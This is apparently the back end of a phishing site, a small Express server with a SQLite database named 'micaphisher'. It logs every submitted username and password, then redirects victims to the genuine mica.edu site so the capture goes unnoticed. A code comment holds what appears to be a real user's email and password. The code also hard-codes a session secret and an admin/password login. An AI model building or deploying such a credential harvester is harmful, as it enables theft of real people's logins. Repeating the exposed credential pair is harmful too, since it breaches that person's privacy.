const express = require('express')
const session = require('express-session');
const app = express()
const port = 3000

// middleware
app.use(express.urlencoded({ extended: false })) // properly decode urlencoded request
app.use(session({
	resave: false, // don't save session if unmodified
	saveUninitialized: false, // don't create session until something stored
	secret: 'shhhh, very secret' // required secret value
}))

// serve up static html files from content folder
app.use(express.static(__dirname + "/content"))

// respond to HTTP POST against /login
app.post('/login', function(req, res) {
	console.log(req.body.username)
	console.log(req.body.password)
	if (req.body.username == 'admin' && req.body.password == 'password') {
		res.redirect('admin.html')
	} else {
		res.redirect('https://mica.edu')
	}
})

// start server
app.listen(port, () => console.log(`Listening on port ${port}`))

//sqlite
const sqlite3 = require('sqlite3').verbose();

console.log("setting up database");

let db = new sqlite3.Database('./db/micaphisher.db', (err) => {
	if (err) {
	  console.error(err.message);
	}
	console.log('Connected to the micaphisher database.');
  });


// create table micadata(username text, password text);
// insert into micadate (username, password) values ('chuck@mica.edu', 'kidwalom1@');
// select * from micadata;
